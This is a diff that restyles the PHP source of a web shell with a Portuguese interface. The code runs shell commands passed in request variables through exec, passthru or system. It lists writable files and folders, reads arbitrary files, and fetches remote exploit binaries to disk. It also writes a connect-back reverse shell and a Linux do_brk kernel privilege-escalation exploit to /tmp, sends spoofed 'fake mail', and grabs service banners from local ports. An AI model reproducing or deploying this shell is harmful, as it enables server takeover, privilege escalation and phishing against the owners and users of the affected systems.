@@ -4,7 +4,6 @@
 <DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #F3b700;">Informação do sistema</DIV>
 <?php
 
-//
   closelog();
 
   $dono = get_current_user();
@@ -12,7 +11,7 @@
   $login = posix_getuid();
   $euid = posix_geteuid();
   $gid = posix_getgid();
-  if ($chdir == "") {
+  if ('' == $chdir) {
       $chdir = getcwd();
   }
 
@@ -24,7 +23,7 @@
   while (list($info, $value) = each($uname)) {
       ?>
   <TR>
-    <TD><DIV STYLE="font-family: verdana; font-size: 15px;"><?= $info ?>: <?= $value ?></DIV></TD>
+    <TD><DIV STYLE="font-family: verdana; font-size: 15px;"><?= $info; ?>: <?= $value; ?></DIV></TD>
   </TR>
 <?php
   }
@@ -32,19 +31,19 @@
  
   <TR>
    <TR>
-    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Script Current User: <?= $dono ?></DIV></TD>
+    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Script Current User: <?= $dono; ?></DIV></TD>
   </TR>
   <TR>
-    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">PHP Version: <?= $ver ?></DIV></TD>
+    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">PHP Version: <?= $ver; ?></DIV></TD>
   </TR>
   <TR>
-    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">User Info: uid(<?= $login ?>) euid(<?= $euid ?>) gid(<?= $gid ?>)</DIV></TD>
+    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">User Info: uid(<?= $login; ?>) euid(<?= $euid; ?>) gid(<?= $gid; ?>)</DIV></TD>
   </TR>
   <TR>
-    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Current Path: <?= $chdir ?></DIV></TD>
+    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Current Path: <?= $chdir; ?></DIV></TD>
   </TR>
   <TR>
-    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Server IP: <?php $aaa =  gethostbyname($SERVER_NAME);  echo $aaa;?></DIV></TD>
+    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Server IP: <?php $aaa = gethostbyname($SERVER_NAME); echo $aaa; ?></DIV></TD>
   </TR>
    <TR>
     <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Web Server: <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?></DIV></TD>
@@ -53,20 +52,20 @@
 <BR>
 <?php
 
-  if ($cmd != "") {
-      echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[*] Command Mode Run</DIV>"; ?>
+  if ('' != $cmd) {
+      echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[*] Command Mode Run</DIV>'; ?>
 
 <DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #F3A700;">Command Stdout</DIV>
 <?php
 
-if ($fe == 1) {
-    $fe = "exec";
+if (1 == $fe) {
+    $fe = 'exec';
 }
-      if ($fe == "") {
-          $fe = "passthru";
+      if ('' == $fe) {
+          $fe = 'passthru';
       }
-      if ($fe == "2") {
-          $fe = "system";
+      if ('2' == $fe) {
+          $fe = 'system';
       }
 
       if (isset($chdir)) {
@@ -81,24 +80,24 @@ if ($fe == 1) {
 <?php
 
     if (!empty($output)) {
-        echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
+        echo str_replace('>', '&gt;', str_replace('<', '&lt;', $output));
     } ?>
 </TEXTAREA>
 <BR>
 <?php
   }
- 
-  if ($safemode != "") {
-      echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[*] Safemode Mode Run</DIV>"; ?>
+
+  if ('' != $safemode) {
+      echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[*] Safemode Mode Run</DIV>'; ?>
 <DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #F3A700;">Safe Mode Directory Listing</DIV>
 <?php
 
     if ($dir = @opendir($chdir)) {
-        echo "<TABLE border=1 cellspacing=1 cellpadding=0>";
-        echo "<TR>";
-        echo "<TD valign=top>";
-        echo "<b><font size=2 face=arial>List All Files</b> <br><br>";
-        while (($file = readdir($dir)) !== false) {
+        echo '<TABLE border=1 cellspacing=1 cellpadding=0>';
+        echo '<TR>';
+        echo '<TD valign=top>';
+        echo '<b><font size=2 face=arial>List All Files</b> <br><br>';
+        while (false !== ($file = readdir($dir))) {
             if (@is_file($file)) {
                 $file1 = fileowner($file);
                 $file2 = fileperms($file);
@@ -108,11 +107,11 @@ if ($fe == 1) {
             }
         }
 
-        echo "</TD>";
-        echo"<TD valign=top>";
-        echo "<b><font size=2 face=arial>List Only Folders</b> <br><br>";
+        echo '</TD>';
+        echo'<TD valign=top>';
+        echo '<b><font size=2 face=arial>List Only Folders</b> <br><br>';
         if ($dir = @opendir($chdir)) {
-            while (($file = readdir($dir)) !== false) {
+            while (false !== ($file = readdir($dir))) {
                 if (@is_dir($file)) {
                     $file1 = fileowner($file);
                     $file2 = fileperms($file);
@@ -121,11 +120,11 @@ if ($fe == 1) {
                 }
             }
         }
-        echo "</TD>";
-        echo"<TD valign=top>";
-        echo "<b><font size=2 face=arial>List Writable Folders</b><br><br>";
+        echo '</TD>';
+        echo'<TD valign=top>';
+        echo '<b><font size=2 face=arial>List Writable Folders</b><br><br>';
         if ($dir = @opendir($chdir)) {
-            while (($file = readdir($dir)) !== false) {
+            while (false !== ($file = readdir($dir))) {
                 if (@is_writable($file) && @is_dir($file)) {
                     $file1 = fileowner($file);
                     $file2 = fileperms($file);
@@ -133,13 +132,13 @@ if ($fe == 1) {
                 }
             }
         }
-        echo "</TD>";
-        echo "</TD>";
-        echo "<TD valign=top>";
-        echo "<b><font size=2 face=arial>List Writable Files</b> <br><br>";
- 
+        echo '</TD>';
+        echo '</TD>';
+        echo '<TD valign=top>';
+        echo '<b><font size=2 face=arial>List Writable Files</b> <br><br>';
+
         if ($dir = opendir($chdir)) {
-            while (($file = readdir($dir)) !== false) {
+            while (false !== ($file = readdir($dir))) {
                 if (@is_writable($file) && @is_file($file)) {
                     $file1 = fileowner($file);
                     $file2 = fileperms($file);
@@ -147,16 +146,16 @@ if ($fe == 1) {
                 }
             }
         }
-        echo "</TD>";
-        echo "</TR>";
-        echo "</TABLE>";
+        echo '</TD>';
+        echo '</TR>';
+        echo '</TABLE>';
     }
   }
 
 ?>
 <?php
 
-  if ($shell == "write") {
+  if ('write' == $shell) {
       $shell = "#include <stdio.h>\n" .
              "#include <sys/socket.h>\n" .
              "#include <netinet/in.h>\n" .
@@ -237,17 +236,17 @@ if ($fe == 1) {
              "  return 0;\n" .
              "}\n";
 
-      $fp = fopen("/tmp/dc-connectback.c", "w");
+      $fp = fopen('/tmp/dc-connectback.c', 'w');
       $ok = fwrite($fp, $shell);
 
       if (!empty($ok)) {
-          echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[*] Connect Back Shell Was Successfuly Copied</DIV>";
+          echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[*] Connect Back Shell Was Successfuly Copied</DIV>';
       } else {
-          echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[-] An Error Has Ocurred While Copying Shell</DIV>";
+          echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[-] An Error Has Ocurred While Copying Shell</DIV>';
       }
   }
 
-  if ($kernel == "write") {
+  if ('write' == $kernel) {
       $kernel = "/*\n" .
               " * hatorihanzo.c\n" .
               " * Linux kernel do_brk vma overflow exploit.\n" .
@@ -529,13 +528,13 @@ if ($fe == 1) {
               "      return EXIT_FAILURE;\n" .
               "}\n";
 
-      $fp = fopen("/tmp/xpl_brk.c", "w");
+      $fp = fopen('/tmp/xpl_brk.c', 'w');
       $ok = fwrite($fp, $kernel);
-    
+
       if (!empty($ok)) {
-          echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[*] Linux Local Kernel Exploit Was Successfuly Copied</DIV>";
+          echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[*] Linux Local Kernel Exploit Was Successfuly Copied</DIV>';
       } else {
-          echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[-] An Error Has Ocurred While Copying Kernel Exploit</DIV>";
+          echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[-] An Error Has Ocurred While Copying Kernel Exploit</DIV>';
       }
   }
 
@@ -545,37 +544,37 @@ if ($fe == 1) {
 <?php
 
 // Function to Visualize Source Code files
-if ($see != "") {
-    $fp = fopen($see, "r");
+if ('' != $see) {
+    $fp = fopen($see, 'r');
     $read = fread($fp, 30000);
     echo "============== $see ================<br>";
-    echo "<textarea name=textarea cols=80 rows=15>";
+    echo '<textarea name=textarea cols=80 rows=15>';
     echo "$read";
-    echo "</textarea>";
+    echo '</textarea>';
 }
 
 // Function to Dowload Local Xploite Binary COde or Source Code
 
-if ($dx != "") {
+if ('' != $dx) {
     $fp = @fopen("$hostxpl", r);
-    $fp2 = @fopen("$storage", "w");
-    fwrite($fp2, "");
-    $fp1 = @fopen("$storage", "a+");
+    $fp2 = @fopen("$storage", 'w');
+    fwrite($fp2, '');
+    $fp1 = @fopen("$storage", 'a+');
     for (;;) {
         $read = @fread($fp, 4096);
         if (empty($read)) {
             break;
         }
         $ok = fwrite($fp1, $read);
-    
+
         if (empty($ok)) {
-            echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[-] An Error Has Ocurred While Uploading File</DIV>";
+            echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[-] An Error Has Ocurred While Uploading File</DIV>';
             break;
         }
     }
 
     if (!empty($ok)) {
-        echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[*] File Was Successfuly Uploaded</DIV>";
+        echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[*] File Was Successfuly Uploaded</DIV>';
     }
 }
 
@@ -583,13 +582,13 @@ flush();
 
 // Function to visulize Format Color Source Code PHP
 
-if ($sfc != "") {
+if ('' != $sfc) {
     $showcode = show_source("$sfc");
     echo "<font size=4> $showcode </font>";
 }
 
 // Function to Visualize all infomation files
-if ($fileinfo != "") {
+if ('' != $fileinfo) {
     $infofile = stat("$fileanalize");
     while (list($info, $value) = each($infofile)) {
         echo" Info: $info  Value: $value <br>";
@@ -597,31 +596,31 @@ if ($fileinfo != "") {
 }
 
 // Function to send fake mail
-if ($fake == 1) {
+if (1 == $fake) {
     echo "<FORM METHOD=POST ACTION=\"$SCRIPT_NAME?$QUERY_STRING&send=1\">";
-    echo "Your Fake Mail <INPUT TYPE=\"\" NAME=\"yourmail\"><br>";
-    echo "Your Cavy:<INPUT TYPE=\"\" NAME=\"cavy\"><br>";
-    echo "Suject: <INPUT TYPE=\"text\" NAME=\"subject\"><br>";
-    echo "Text: <TEXTAREA NAME=\"body\" ROWS=\"\" COLS=\"\"></TEXTAREA><br>";
-    echo "<INPUT TYPE=\"hidden\" NAME=\"send\" VALUE=\"1\"><br>";
-    echo "<INPUT TYPE=\"submit\" VALUE=\"Send Fake Mail\">";
-    echo "</FORM>";
+    echo 'Your Fake Mail <INPUT TYPE="" NAME="yourmail"><br>';
+    echo 'Your Cavy:<INPUT TYPE="" NAME="cavy"><br>';
+    echo 'Suject: <INPUT TYPE="text" NAME="subject"><br>';
+    echo 'Text: <TEXTAREA NAME="body" ROWS="" COLS=""></TEXTAREA><br>';
+    echo '<INPUT TYPE="hidden" NAME="send" VALUE="1"><br>';
+    echo '<INPUT TYPE="submit" VALUE="Send Fake Mail">';
+    echo '</FORM>';
 }
 
-if ($send == 1) {
+if (1 == $send) {
     if (mail($cavy, $subject, $body, "From: $yourmail\r\n")) {
-        echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[*] Mail Send Sucessfuly</DIV>";
+        echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[*] Mail Send Sucessfuly</DIV>';
     } else {
-        echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[-] An Error Has Ocurred While Sending Mail</DIV>";
+        echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[-] An Error Has Ocurred While Sending Mail</DIV>';
     }
 }
 
-if ($portscan != "") {
-    $port = array("21","22","23","25","110",);
+if ('' != $portscan) {
+    $port = ['21', '22', '23', '25', '110'];
     $values = count($port);
-    for ($cont=0; $cont < $values; $cont++) {
-        @$sock[$cont] = Fsockopen($SERVER_NAME, $port[$cont], $oi, $oi2, 1);
-        $service = Getservbyport($port[$cont], "tcp");
+    for ($cont = 0; $cont < $values; ++$cont) {
+        @$sock[$cont] = fsockopen($SERVER_NAME, $port[$cont], $oi, $oi2, 1);
+        $service = getservbyport($port[$cont], 'tcp');
         @$get = fgets($sock[$cont]);
         echo "<br>Port: $port[$cont] - Service: $service<br><br>";
         echo "<br>Banner: $get <br><br>";
